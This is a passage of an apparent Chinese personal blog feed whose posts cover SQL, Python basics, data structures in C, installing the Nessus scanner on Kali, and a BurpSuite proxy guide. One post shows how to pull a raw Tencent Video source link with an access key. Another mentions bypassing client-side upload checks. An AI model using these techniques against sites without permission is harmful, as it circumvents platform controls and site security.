<td>ALL] &lt;列名&gt;)</td>
<td>计算一列值的总和(此列必须为数值型)</td>
</tr>
<tr>
<td>AVG([DISTINCT\</td>
<td>ALL] &lt;列名&gt;)</td>
<td>计算一列值的平均值(此列必须为数值型)</td>
</tr>
<tr>
<td>MAX([DISTINCT\</td>
<td>ALL] &lt;列名&gt;)</td>
<td>求一列值中的最大值</td>
</tr>
<tr>
<td>MIN([DISTINCT\</td>
<td>ALL] &lt;列名&gt;)</td>
<td>求一列值中的最小值</td>
</tr>
</tbody>
</table>
</div>
<p>当聚集函数遇到空值时,除COUNT(*)外,都跳过空值而只处理非空值.COUNT(*)是对元组进行计数,某个元组的一个或部分列取空值不影响COUNT的统计结果</p>
<h3 id="LIMIT子句"><a href="#LIMIT子句" class="headerlink" title="LIMIT子句"></a>LIMIT子句</h3><p>限制查询返回的记录,LIMIT子句要放在最后</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> customers</span><br><span class="line">LIMIT <span class="number">3</span></span><br><span class="line"><span class="comment">-- 限制返回结果为前3个</span></span><br><span class="line">LIMIT <span class="number">6</span>,<span class="number">3</span></span><br><span class="line"><span class="comment">-- 跳过前6个,再选择3个</span></span><br></pre></td></tr></table></figure>
<h3 id="内连接"><a href="#内连接" class="headerlink" title="内连接"></a>内连接</h3><h2 id="数据库编程"><a href="#数据库编程" class="headerlink" title="数据库编程"></a>数据库编程</h2><h3 id="嵌入式SQL"><a href="#嵌入式SQL" class="headerlink" title="嵌入式SQL"></a>嵌入式SQL</h3><p>对于嵌入式SQL,数据库管理系统通常采用预编</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>python笔记</title>
    <url>/article/45014.html</url>
    <content><![CDATA[<h1 id="python笔记"><a href="#python笔记" class="headerlink" title="python笔记"></a>python笔记</h1><a id="more"></a>
<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><h3 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h3><p>例子:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#这是单行注释</span></span><br></pre></td></tr></table></figure>
<h3 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h3><p>例子:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">这是多行注释</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="python2中文的解决"><a href="#python2中文的解决" class="headerlink" title="python2中文的解决"></a>python2中文的解决</h2><p>如果python程序中出现中文,使用python2会出现下面情形</p>
<p><img src="https://i.loli.net/2021/02/23/EkdVvtGlWsgimcM.png" alt=""></p>
<p>方法一:</p>
<p>在.py文件首行加如下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#coding&#x3D;utf-8</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/23/2Emov5c6zDVNHeX.png" alt=""></p>
<p>方法二(python推荐):</p>
<p>在.py文件首行加如下代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/23/5mZEGStriAYQPuq.png" alt=""></p>
<h2 id="python2与python3的区别"><a href="#python2与python3的区别" class="headerlink" title="python2与python3的区别"></a>python2与python3的区别</h2><p>python2中的input与python3的不同,python2中input将从键盘得到的数据当成代码执行;python2中的raw_input()类似python3(没有raw_input())中为input() ,所以python2中可用raw_input()</p>
<p>注意：raw_input()和input()都获取的是字符串,字符串不能做-,*,/运算,做+运算只是拼接,可用int()函数获得数字,如int(input())</p>
<p>python2中的不等于号&lt;&gt;,而python3中&lt;&gt;则不能使用</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>教你如何获取腾讯视频源地址链接</title>
    <url>/article/28328.html</url>
    <content><![CDATA[<h1 id="教你如何获取腾讯视频源地址链接"><a href="#教你如何获取腾讯视频源地址链接" class="headerlink" title="教你如何获取腾讯视频源地址链接"></a>教你如何获取腾讯视频源地址链接</h1><a id="more"></a>
<p>下面以<a href="https://v.qq.com/x/cover/umpnsyqfu7f60se/n003547u6to.html">星骸骑士第5集</a>为例获取其视频源链接</p>
<h2 id="1-获取视频vid"><a href="#1-获取视频vid" class="headerlink" title="1.获取视频vid"></a>1.获取视频vid</h2><p><img src="https://i.loli.net/2021/01/28/qaZ7UP3RvO2p9wn.png" alt="image-20210128094307061"></p>
<p>本视频的vid为:<strong>n003547u6to</strong></p>
<h2 id="2-获取视频相关信息"><a href="#2-获取视频相关信息" class="headerlink" title="2.获取视频相关信息"></a>2.获取视频相关信息</h2><p>将获取的vid替换到以下接口地址中的vid</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://vv.video.qq.com/getinfo?vids=n003547u6to&amp;platform=101001&amp;charge=0&amp;otype=json</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/28/bKydUeomPDJ26pv.png" alt="image-20210128094934650"></p>
<p>替换后直接访问<a href="https://vv.video.qq.com/getinfo?vids=n003547u6to&amp;platform=101001&amp;charge=0&amp;otype=json">此接口地址</a>,得到视频相关信息</p>
<p><img src="https://i.loli.net/2021/01/28/6WDMa4ZYCpmK9c7.png" alt="image-20210128095135162"></p>
<h2 id="3-记录fn值-fvkey值-url值"><a href="#3-记录fn值-fvkey值-url值" class="headerlink" title="3.记录fn值,fvkey值,url值"></a>3.记录fn值,fvkey值,url值</h2><p><img src="https://i.loli.net/2021/01/28/ClqnVZ8i17ymrbQ.png" alt="image-20210128095804655" style="zoom:150%;" /></p>
<p>fn值:n003547u6to.mp4</p>
<p>fvkey值:C6BC3B0988CA19AA2F174E5D78E2B423980D558135C5C2D121533A22C4296B58AC52A0CCA5E0D1F2999B20CF4B4A9DCE560088AA238AFA2DD377158F603EEF853EF7FE56F25027CCEE6856BC6C53C831D055DF618F89D9405DE9A84A9B3D3F183F50B8B26BD49B564C9B733F27791429</p>
<p>url值:<a href="http://101.206.186.29/vlive.qqvideo.tc.qq.com/A8q7f567bhHzdteBgaLoRWLtIt01ZxK4F-vSY8TLLzUo/uwMROfz2r5zAoaQXGdGlC2dfDmYqGCmd2Ymfgp6_SfoyIMNz/">http://101.206.186.29/vlive.qqvideo.tc.qq.com/A8q7f567bhHzdteBgaLoRWLtIt01ZxK4F-vSY8TLLzUo/uwMROfz2r5zAoaQXGdGlC2dfDmYqGCmd2Ymfgp6_SfoyIMNz/</a></p>
<h2 id="4-通过公式组合成源视频链接"><a href="#4-通过公式组合成源视频链接" class="headerlink" title="4.通过公式组合成源视频链接"></a>4.通过公式组合成源视频链接</h2><p>组合公式为：url值 + fn值? + vkey值 + fvkey值(注意fn值后面要加个问号)</p>
<p><img src="https://i.loli.net/2021/01/28/AeaLG8kNQ5Y9Cc7.png" alt="image-20210128100914780"></p>
<p>源视频链接为:<a href="http://101.206.186.29/vlive.qqvideo.tc.qq.com/A8q7f567bhHzdteBgaLoRWLtIt01ZxK4F-vSY8TLLzUo/uwMROfz2r5zAoaQXGdGlC2dfDmYqGCmd2Ymfgp6_SfoyIMNz/n003547u6to.mp4?C6BC3B0988CA19AA2F174E5D78E2B423980D558135C5C2D121533A22C4296B58AC52A0CCA5E0D1F2999B20CF4B4A9DCE560088AA238AFA2DD377158F603EEF853EF7FE56F25027CCEE6856BC6C53C831D055DF618F89D9405DE9A84A9B3D3F183F50B8B26BD49B564C9B733F27791429">http://101.206.186.29/vlive.qqvideo.tc.qq.com/A8q7f567bhHzdteBgaLoRWLtIt01ZxK4F-vSY8TLLzUo/uwMROfz2r5zAoaQXGdGlC2dfDmYqGCmd2Ymfgp6_SfoyIMNz/n003547u6to.mp4?C6BC3B0988CA19AA2F174E5D78E2B423980D558135C5C2D121533A22C4296B58AC52A0CCA5E0D1F2999B20CF4B4A9DCE560088AA238AFA2DD377158F603EEF853EF7FE56F25027CCEE6856BC6C53C831D055DF618F89D9405DE9A84A9B3D3F183F50B8B26BD49B564C9B733F27791429</a></p>
]]></content>
      <categories>
        <category>无处安放</category>
      </categories>
      <tags>
        <tag>视频解析</tag>
      </tags>
  </entry>
  <entry>
    <title>Kail Linux虚拟机安装配置Nessus漏洞扫描器</title>
    <url>/article/57445.html</url>
    <content><![CDATA[<h1 id="Kail-Linux虚拟机安装配置Nessus漏洞扫描器"><a href="#Kail-Linux虚拟机安装配置Nessus漏洞扫描器" class="headerlink" title="Kail Linux虚拟机安装配置Nessus漏洞扫描器"></a>Kail Linux虚拟机安装配置Nessus漏洞扫描器</h1><a id="more"></a>
<h2 id="1-获取激活码"><a href="#1-获取激活码" class="headerlink" title="1.获取激活码"></a>1.获取激活码</h2><p>前往<a href="https://www.tenable.com/products/nessus/nessus-essentials">官网</a>进行注册</p>
<p><img src="https://i.loli.net/2021/01/26/HVptOeBDnJZlF6w.png" alt=""></p>
<h2 id="2-下载nessus"><a href="#2-下载nessus" class="headerlink" title="2.下载nessus"></a>2.下载nessus</h2><p>注册完毕后前往下载页面</p>
<p><img src="https://i.loli.net/2021/01/26/SaI7x2nDEHRfMOu.png" alt=""></p>
<p>选择deb结尾的(我选择的64位)</p>
<p><img src="https://i.loli.net/2021/01/26/hPzGvds7T2bXirE.png" alt=""></p>
<p>官网下载较慢,这里我准备了一份,<a href="https://idefun.lanzous.com/iQnR4kvm5oh">点击下载</a></p>
<h2 id="3-安装nessus"><a href="#3-安装nessus" class="headerlink" title="3.安装nessus"></a>3.安装nessus</h2><p>将nessus拖入kail linux虚拟机</p>
<p><img src="https://i.loli.net/2021/01/26/Mca54FXCQuY6x7p.png" alt=""></p>
<p>打开终端,切换至桌面</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd 桌面</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/26/ekf7ri8R54ZuwDW.png" alt=""></p>
<p>安装nessus(需要密码)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i Nessus-8.13.1-debian6_amd64.deb</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/01/26/hYk1gFqJplIuQw9.png" alt=""></p>
<p>安装完成</p>
<p><img src="https://i.loli.net/2021/01/26/KWfAuHosZB7vJ1F.png" alt=""></p>
<h2 id="4-启动nessus"><a href="#4-启动nessus" class="headerlink" title="4.启动nessus"></a>4.启动nessus</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/bin/systemctl start nessusd.service</span><br></pre></td></tr></table></figure>
<p>同样需要密码</p>
<p><img src="https://i.loli.net/2021/01/26/1Wjf7rMiImHSk4A.png"  /></p>
<p>在浏览器中访问</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">https://kali:8834/</span><br></pre></td></tr></table></figure>
<p>选择Managed Scanner</p>
<p><img src="https://i.loli.net/2021/01/26/Y9wajpE7ye1JhVv.png" alt=""></p>
<p>选择Tenable.sc</p>
<p><img src="https://i.loli.net/2021/01/26/ONiI4T2EJeylcZ5.png" alt=""></p>
<p>创建账号</p>
<p><img src="https://i.loli.net/2021/01/26/1KLS8misZR7DVCI.png" alt=""></p>
]]></content>
      <categories>
        <category>Hack</category>
      </categories>
      <tags>
        <tag>Nessus</tag>
        <tag>Kail</tag>
      </tags>
  </entry>
  <entry>
    <title>BurpSuite的设置及使用</title>
    <url>/article/13804.html</url>
    <content><![CDATA[<h1 id="BurpSuite的设置及使用"><a href="#BurpSuite的设置及使用" class="headerlink" title="BurpSuite的设置及使用"></a>BurpSuite的设置及使用</h1><h2 id="1-BurpSuite安装与配置"><a href="#1-BurpSuite安装与配置" class="headerlink" title="1.BurpSuite安装与配置"></a>1.BurpSuite安装与配置</h2><h3 id="BurpSuite功能介绍"><a href="#BurpSuite功能介绍" class="headerlink" title="BurpSuite功能介绍"></a>BurpSuite功能介绍</h3><p>BurpSuite是用于攻击web应用程序的集成平台，包含了许多工具。BurpSuite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP消息、持久性、认证、代理、日志、警报。</p>
<p>Burpsuite是由JAVA语言编写,所以Burpsuite是-款跨平台的软件。但是在测试过程中Buripsuite不像其他自动化测试工具不需要输入任何内容即可完成测试，而需要手动的配置某些参数触发对应的行为才会完成测试。</p>
<h2 id="2-BurpSuite-Proxy模块"><a href="#2-BurpSuite-Proxy模块" class="headerlink" title="2.BurpSuite Proxy模块"></a>2.BurpSuite Proxy模块</h2><p>Burp Proxy 是Burp Suite以用户驱动测试流程功能的核心，通过代理模式，可以让我们拦截、查看、修改所有在客户端和服务端之间传输的数据。</p>
<h3 id="1-Intercept"><a href="#1-Intercept" class="headerlink" title="1.Intercept"></a>1.Intercept</h3><p>Forward表示将截断的HTTP或HTTPS请求发送到服务器。<br>Drop表示将截断的HTTP或HTTPS请求丢弃。<br>Intercept is on和Intercept is off表示开启或关闭代理截断功能。<br>Action表示将代理截断的HTTP或HTTPS请求发送到其他模块或做其他处理。<br>对Intercept进行Raw Hex Params Header切换查看不同的数据格式。</p>
<h3 id="2-HTTP-history"><a href="#2-HTTP-history" class="headerlink" title="2.HTTP history"></a>2.HTTP history</h3><p>HTTP history用来查看提交过的HTTP请求。<br>Fiter可以过滤显示某些HTTP请求。点击Filter就可以打开。对于指定URL可以选中右键点击,执行其他操作。WebSockets history与HTTP history功能类似。</p>
<h3 id="3-options"><a href="#3-options" class="headerlink" title="3.options"></a>3.options</h3><p>Options具有的功能:代理监听设置、戳断客户端请求、截断服务器响应、截断WebSocket通信、服务端响应修改(绕过JS验证文件上传)、匹配与替换HTTP消息中的内容、通过SSL连接Web服务器配置、其他配置选项。</p>
<h3 id="4-设置proxy-listener"><a href="#4-设置proxy-listener" class="headerlink" title="4.设置proxy listener"></a>4.设置proxy listener</h3><p>通过设置Proxy Listeners来截断数据流量。比如设置监听端口等。BurpSuite默认监听8080端口.</p>
<p>修改端口:</p>
<p>1.关闭截断</p>
<p>2.options-&gt;edit</p>
<p>3.修改端口,点击running</p>
<p>4.修改浏览器端口</p>
<p>5.Internet选项-&gt;连接-&gt;局域网设置</p>
<p>6.修改端口</p>
<h3 id="5-设置intercept-client-requests"><a href="#5-设置intercept-client-requests" class="headerlink" title="5.设置intercept client requests"></a>5.设置intercept client requests</h3><p>通过设置Intercept Client Requests来截断符合条件的HTTP请求。</p>
<h3 id="6-设置Intercept-Server-Response"><a href="#6-设置Intercept-Server-Response" class="headerlink" title="6.设置Intercept Server Response"></a>6.设置Intercept Server Response</h3><p>通过设置Intercept Server Response来筛选出符合条件的HTTP响应。</p>
<h3 id="7-设置截断Websocket通信以及修改Response的内容"><a href="#7-设置截断Websocket通信以及修改Response的内容" class="headerlink" title="7.设置截断Websocket通信以及修改Response的内容"></a>7.设置截断Websocket通信以及修改Response的内容</h3><h3 id="8-匹配以及修改HTTP消息"><a href="#8-匹配以及修改HTTP消息" class="headerlink" title="8.匹配以及修改HTTP消息"></a>8.匹配以及修改HTTP消息</h3><p>可以修改HTTP请求和HTTP响应中的内容。</p>
<h2 id="3-Burpsuite抓取手机APP流量"><a href="#3-Burpsuite抓取手机APP流量" class="headerlink" title="3.Burpsuite抓取手机APP流量"></a>3.Burpsuite抓取手机APP流量</h2><p>目前WebApp(手机App)的通信任然使用HTTP协议进行对应的通信.可以通过Burp设置代理,然后手机设置网络代理,通过Burp截断手机APP流量.</p>
<p>1.Burpsuite设置截断所有网卡的流量，那么局城网中所有的主机都可以通过该代理进行网络访问。</p>
<p><img src="https://i.loli.net/2021/01/24/n1owBAfCMJXqvhW.png" alt=""></p>
<p><img src="https://i.loli.net/2021/01/24/Cu6NGxn2SI57hBs.png" alt=""></p>
<p>2.查看电脑ip</p>
<p>3.在手机网络设置中，填写对应的代理。</p>
<p><img src="https://i.loli.net/2021/01/24/gcYyFBzhjZEKOev.png" alt=""></p>
<p><img src="https://i.loli.net/2021/01/24/US7BIW1oNuXlHhJ.png" alt=""></p>
<p><img src="https://i.loli.net/2021/01/24/o8hED3xYzjUlvC9.png" alt=""></p>
<p>4.Burpsuite开启截断</p>
<p><img src="https://i.loli.net/2021/01/24/nU8QWAlJGESgP96.png" alt=""></p>
<h2 id="4-Burpsuite剔除JS脚本-绕过JS文件上传验证"><a href="#4-Burpsuite剔除JS脚本-绕过JS文件上传验证" class="headerlink" title="4.Burpsuite剔除JS脚本(绕过JS文件上传验证)"></a>4.Burpsuite剔除JS脚本(绕过JS文件上传验证)</h2><p>JavaScript—-种直译式脚本语言，是一种动态类型、 弱类型、基于原型的语言，内置支持类型。它的解释器被称为JavaScript引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在HTML (标准通用标记语言下的一个应用)网页上使用，用来给HTML网页增加动态功能。例如:对于上传文件进行JS验证。</p>
<p><img src="https://i.loli.net/2021/01/25/P1A6G4zFDUpbRs3.png" alt=""></p>
<p>也可以使用浏览器审计工具直接删除JS</p>
<h2 id="5-Burpsuite-Target介绍"><a href="#5-Burpsuite-Target介绍" class="headerlink" title="5.Burpsuite Target介绍"></a>5.Burpsuite Target介绍</h2><p>Burp Target组件主要包含站点地图、目标域、Target 工具三部分组成，他们帮助渗透测试人员更好地了解目标应用的整体状况、当前的工作涉及哪些目标域、分析可能存在的攻击面等信息</p>
<p>Target Scope中作用域的定义比较宽泛，通常来说，当我们对某个产品进行渗透测试时，可以通过域名或者主机名去限制拦截内容，这里域名或主机名就是我们说的作用域;如果我们想限制得更为细粒度化，比如，你只想拦截login目录下的所有请求，这时我们也可以在此设置，此时，作用域就是目录。</p>
<h3 id="Target站点地图Sitemap介绍"><a href="#Target站点地图Sitemap介绍" class="headerlink" title="Target站点地图Sitemap介绍"></a>Target站点地图Sitemap介绍</h3><p>Site Map的左边为访问的URL,按照网站的层级和深度，树形展示整个应用系统的结构和关联其他域的url情况;右边显示的是某一个url被访问的明细列表，共访问哪些url,请求和应答内容分别是什么，都有着详实的记录。基于左边的树形结构，我们可以选择某个分支，对指定的路径进行扫描和抓取</p>
<h2 id="6-Burpsuite-站点地图介绍"><a href="#6-Burpsuite-站点地图介绍" class="headerlink" title="6.Burpsuite 站点地图介绍"></a>6.Burpsuite 站点地图介绍</h2><h3 id="目标分析"><a href="#目标分析" class="headerlink" title="目标分析"></a>目标分析</h3><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708061126089.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708061243107.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708061313124.png" alt=""></p>
<h3 id="站点地图比较"><a href="#站点地图比较" class="headerlink" title="站点地图比较"></a>站点地图比较</h3><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708061805978.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708061858034.png" alt=""></p>
<h2 id="7-BurpSuite-爬虫介绍"><a href="#7-BurpSuite-爬虫介绍" class="headerlink" title="7.BurpSuite 爬虫介绍"></a>7.BurpSuite 爬虫介绍</h2><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708072254485.png" alt="image-20210708072254485"></p>
<h3 id="BurpSuite-spider-control介绍"><a href="#BurpSuite-spider-control介绍" class="headerlink" title="BurpSuite spider control介绍"></a>BurpSuite spider control介绍</h3><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708072433387.png" alt="image-20210708072433387"></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708074243626.png" alt="image-20210708074243626"></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708074425977.png" alt="image-20210708074425977"></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708074440370.png" alt="image-20210708074440370"></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708074847766.png" alt="image-20210708074847766"></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708085028692.png" alt="image-20210708085028692"></p>
<h2 id="8-BurpSuite-漏洞扫描介绍"><a href="#8-BurpSuite-漏洞扫描介绍" class="headerlink" title="8.BurpSuite 漏洞扫描介绍"></a>8.BurpSuite 漏洞扫描介绍</h2><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708090758906.png" alt="image-20210708090758906"></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708091157848.png" alt="image-20210708091157848"></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708091209413.png" alt="image-20210708091209413"></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708091304387.png" alt="image-20210708091304387"></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708091509730.png" alt="image-20210708091509730"></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708092032622.png" alt="image-20210708092032622"></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708092618118.png" alt="image-20210708092618118"></p>
<h2 id="9-BurpSuite-Intruder模块介绍"><a href="#9-BurpSuite-Intruder模块介绍" class="headerlink" title="9.BurpSuite Intruder模块介绍"></a>9.BurpSuite Intruder模块介绍</h2><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708093712409.png" alt="image-20210708093712409"></p>
<h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708093804196.png" alt="image-20210708093804196"></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708094507606.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708153113545.png" alt="image-20210708153113545"></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708153201596.png" alt="image-20210708153201596"></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708154420924.png" alt="image-20210708154420924"></p>
<h2 id="10-BurpSuite-repeater介绍"><a href="#10-BurpSuite-repeater介绍" class="headerlink" title="10.BurpSuite repeater介绍"></a>10.BurpSuite repeater介绍</h2><p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210708155215613.png" alt="image-20210708155215613"></p>
]]></content>
      <categories>
        <category>Hack</category>
      </categories>
      <tags>
        <tag>BurpSuite</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构与算法总结</title>
    <url>/article/42825.html</url>
    <content><![CDATA[<h1 id="数据结构与算法"><a href="#数据结构与算法" class="headerlink" title="数据结构与算法"></a>数据结构与算法</h1><h2 id="一-绪论"><a href="#一-绪论" class="headerlink" title="一.绪论"></a>一.绪论</h2><p>算法是为了解决实际问题而设计的.数据结构是算法需要处理的问题载体.</p>
<h3 id="基本概念和术语"><a href="#基本概念和术语" class="headerlink" title="基本概念和术语:"></a>基本概念和术语:</h3><ul>
<li><p>数据:数据是指能输入到计算机中并能够被计算机处理的一切对象.</p>
</li>
<li><p>数据元素:数据元素是数据的基本单位.</p>
</li>
<li><p>数据项:一个数据元素可由若干数据项组成.</p>
</li>
<li><p>数据对象:数据对象是具有相同性质的数据元素的集合.</p>
</li>
</ul>
<ul>
<li>数据结构:数据结构是指互相之间存在着一种或多种关系的数据元素的集合.</li>
</ul>
<hr>
<h3 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构:"></a>逻辑结构:</h3><p>1.集合结构:数据元素同属一个集合，单个数据元素之间没有任何关系</p>
<p><img src="https://i.loli.net/2021/01/11/qoiHNkTzsJxjBGD.png" alt=""></p>
<p>​    2.线性结构:类似于线性关系,数据元素之间是一对一的关系</p>
<p><img src="https://i.loli.net/2021/01/11/a3LdovfMAlmkNxE.png" alt=""></p>
<p>​    3.树形结构:树形结构中的数据元素之间存在一对多的关系</p>
<p><img src="https://i.loli.net/2021/01/11/c7e6tdFC3w1NAlo.png" alt=""></p>
<p>​    4.图形结构:数据元素之间是多对多的关系</p>
<p><img src="https://i.loli.net/2021/01/11/nGcsUypoHmbizL9.png" alt=""></p>
<hr>
<h3 id="存储结构-物理结构"><a href="#存储结构-物理结构" class="headerlink" title="存储结构(物理结构):"></a>存储结构(物理结构):</h3><p>(数据结构种类很多， 甚至你也可以发明自己的数据结构， 但是底层存储无非数组或者链表 ,那些多样化的数据结构， 究其源头， 都是在链表或者数组上的特殊操作 )</p>
<p>1.顺序存储:一段连续的内存空间</p>
<ul>
<li>优点：随机访问</li>
</ul>
<ul>
<li>缺点：插入删除效率低，大小固定</li>
</ul>
<p>2.链式存储:不连续的内存空间</p>
<ul>
<li>优点：大小动态扩展，插入删除效率高</li>
</ul>
<ul>
<li>缺点：不能随机访问</li>
</ul>
<p>3.索引:为了方便查找，整体无序，但索引块之间有序，需要额外空间存储索引表</p>
<ul>
<li><p>优点：对顺序查找的一种改进，查找效率高</p>
</li>
<li><p>缺点：需额外空间存储索引</p>
</li>
</ul>
<p>4.散列:选取某个函数，数据元素根据函数计算存储位置,可能存在多个数据元素存储在同一位置，引起地址冲突</p>
<ul>
<li>优点：查找基于数据本身即可找到，查找效率高，存取效率高</li>
</ul>
<ul>
<li>缺点：存取随机，不便于顺序查找</li>
</ul>
<p>队列,栈这两种数据结构既可以使用链表也可以使用数组实现.用数组实现,就要处理扩容缩容的问题; 用链表实现,则没有这个问题,但需要更多的内存空间存储节点指针</p>
<p>图的两种表示方法,邻接表就是链表,邻接矩阵就是二维数组.邻接矩阵判断连通性迅速,并可以进行矩阵运算解决一些问题,但是如果图比较稀疏的话很耗费空间.邻接表比较节省空间,但是很多操作的效率上肯定比不过邻接矩阵。</p>
<p>散列表就是通过散列函数把键映射到一个大数组里,而且对于解决散列冲突的方法,拉链法需要链表特性,操作简单,但需要额外的空间存储指针;线性探查法就需要数组特性,以便连续寻址,不需要指针的存储空间,但操作稍微复些.  </p>
<hr>
<h3 id="影响算法运行时间的因素"><a href="#影响算法运行时间的因素" class="headerlink" title="影响算法运行时间的因素:"></a>影响算法运行时间的因素:</h3><p>1.运行程序的计算机的机器指令的品质与速度</p>
<p>2.书写程序的语言(一般实现语言级别越高,其执行效率越低)</p>
<p>3.编译程序所生成目标代码的质量</p>
<p>4.问题的规模</p>
<hr>
<h3 id="大O表示法-用来表示时间复杂度函数的增长率的上界"><a href="#大O表示法-用来表示时间复杂度函数的增长率的上界" class="headerlink" title="大O表示法:用来表示时间复杂度函数的增长率的上界"></a>大O表示法:用来表示时间复杂度函数的增长率的上界</h3><p>时间复杂度:嵌套(求积),并列(求和),只关注最高次项</p>
<p>空间复杂度:算法运行所需存储空间:</p>
<p>1.程序本身占用的空间</p>
<p>2.算法的输入,输出占用的空间</p>
<p>3.算法运行中占用的空间</p>
<p>评价一个算法的空间复杂度一般只考虑算法运行中所占用的临时空间.</p>
<p>对于一个算法,其时间复杂度和空间复杂度往往是相互影响的.</p>
<h2 id="二-线性表"><a href="#二-线性表" class="headerlink" title="二.线性表"></a>二.线性表</h2><p>线性结构的特点是在数据元素的非空有限集合中,存在唯一的首元素和唯一的尾元素,首元素无直接前驱,尾元素无直接后继,集合中其他数据元素都有唯一的直接前驱和唯一的直接后继.线性表是最简单,最基本,也是最常用的一种线性结构.</p>
<hr>
<p>线性表是具有相同数据类型的n(n&gt;=0)个数据元素的有限序列.</p>
<h3 id="线性表的顺序存储结构"><a href="#线性表的顺序存储结构" class="headerlink" title="线性表的顺序存储结构:"></a>线性表的顺序存储结构:</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20  <span class="comment">//存储空间初始分配量</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ElemType; <span class="comment">//ElemType类型根据实际情况而定,这里假设为int</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType data[MAXSIZE]; <span class="comment">//数组存储数据元素,最大值为MAXSIZE</span></span><br><span class="line">    <span class="keyword">int</span> length;  <span class="comment">//线性表当前长度</span></span><br><span class="line">&#125;SqList;</span><br></pre></td></tr></table></figure>
<p>线性表顺序存储结构需要三个属性:</p>
<ul>
<li>存储空间的起始位置</li>
<li>线性表的最大存储容量(数组的长度)</li>
<li>线性表的当前长度(小于等于数组长度)</li>
</ul>
<p>顺序表的初始化:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">SqList *<span class="title">init_SqList</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SqList *L;</span><br><span class="line">    L=(SqList *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(SqList)); <span class="comment">//动态分配内存空间</span></span><br><span class="line">    <span class="keyword">if</span>(!L) <span class="built_in">exit</span>(<span class="number">1</span>);  <span class="comment">//如果存储分配失败,运行exit()函数终止程序运行</span></span><br><span class="line">    L-&gt;length=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span 